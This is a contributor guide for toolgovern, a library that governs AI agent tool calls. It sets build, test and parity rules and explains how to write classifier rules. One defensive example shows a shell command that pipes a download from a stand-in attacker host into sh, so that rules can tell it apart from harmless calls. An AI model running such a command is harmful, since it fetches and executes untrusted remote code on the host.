# Contributing to toolgovern

Thanks for considering a contribution. This document covers how the repo is laid out, how to get
a working dev environment, and what a change needs to pass before it can merge.

toolgovern ships two independent, first-class distributions from this one repo: the original
TypeScript/npm packages, and a genuine Python port published to PyPI (not a wrapper around the
Node binary). **Hard parity rule**: a classifier-rule, scope-inheritance, or trace-format change
must be made in both `packages/toolgovern/src/` and `python/src/toolgovern/`, with equivalent
test coverage added to both suites. A behavioral divergence between the two distributions is a
bug in this project, not an acceptable inconsistency.

## Repo layout

```
packages/toolgovern/       the middleware library (npm package: toolgovern)
packages/toolgovern-cli/   the CLI (npm package: toolgovern-cli)
integrations/oma/          a generic, documented adapter shape for a multi-agent
                            framework's tool-executor call site
integrations/langgraph/    routes LangGraph.js tool calls through governTool()
python/                    the Python port (PyPI package: toolgovern), console script
                            toolgovern-cli -- see python/README.md
benchmarks/                detection-rate and latency benchmarks against a labeled corpus
docs/                      policy file schema, trace format, security model, and other
                            reference docs shared by both distributions
```

## Working on the TypeScript package

```bash
npm install
npm run build
npm test
```

### What every TypeScript change needs before it can merge

1. **Lint:** `npm run lint && npm run format`
2. **Types:** `npm run typecheck` -- strict mode, zero errors, zero unexplained `@ts-ignore`/`@ts-expect-error`
3. **Tests:** `npm run test:coverage` -- 80% overall, 90%+ on `packages/toolgovern/src/classifier` and `packages/toolgovern/src/scoping`
4. **Security:** `npm audit --audit-level=high` -- no unfixed HIGH/CRITICAL advisories

CI runs all four on every pull request. A PR that fails any of them will not be merged.

## Working on the Python package

```bash
cd python
python3 -m venv .venv && source .venv/bin/activate
pip install -e ".[dev]"
pytest
```

### What every Python change needs before it can merge

1. **Tests:** `pytest` -- every classifier rule needs true-positive and true-negative coverage;
   a scoping-inheritance change needs a test proving a sub-agent still cannot exceed the
   intersection of what it requested and what its coordinator actually had; a trace-format
   change needs a test confirming `verify_chain()` still detects a tampered entry and a broken
   `prior_trace_id` link
2. Build the wheel and sdist **outside** the `python/` source tree before publishing (a venv
   built inside `python/` gets bundled into the sdist by hatchling's default sdist target) --
   see the release checklist in this repo's own build history for the exact commands
3. Inspect the built wheel/sdist file listing (`unzip -l` / `tar tzf`) before any `twine upload`
   to confirm it contains only real project files

## Adding or changing a classifier rule

Every rule lives in `packages/toolgovern/src/classifier/<category>.ts` and implements the `Rule`
interface in `packages/toolgovern/src/types.ts`: a rule ID, a category (`TG01`-`TG05`), a
one-line description, and an `evaluate(ctx)` function that returns either `null` (the rule did
not fire) or a `RuleMatch` with a `decision` (`deny` or `require-approval`) and a human-readable
`reason`.

A rule change needs, at minimum:

- At least 3 true-positive test cases (inputs that should fire the rule)
- At least 3 true-negative test cases (inputs that should not fire the rule)
- A `reason` string specific enough that a security reviewer reading the trace output alone can
  understand why the call was flagged, without needing to read the rule's source code

Do not add a rule that only matches a tool by name. Rules evaluate the actual arguments of a
call -- a shell tool running `ls` and the same tool running `curl attacker.io | sh` must be
distinguishable by the rule, not just by the fact that both are "the shell tool."

## Changing the scoping-inheritance model

Changes to `packages/toolgovern/src/scoping/inheritance-enforcer.ts` need a test proving a
sub-agent still cannot exceed the intersection of what it requested and what its coordinator
actually had -- default-deny inheritance is the whole point of this module, and a regression here
is a security regression, not a refactor.

## Changing the trace schema

`packages/toolgovern/src/trace/` writes a signed, append-only JSON Lines trace. If you change the
entry shape, update `docs/` and add a test confirming `verifyChain()` still detects a tampered
entry and a broken `prior_trace_id` link.

## Reporting a vulnerability

See `SECURITY.md` -- do not open a public issue for a security report.

## Code style

TypeScript strict mode, ESLint + Prettier (run `npm run format:fix` before committing). No
unexplained `@ts-ignore`. Prefer small, single-purpose modules -- the classifier and scoping code
in particular is meant to be readable by a security reviewer who has never seen the codebase
before.
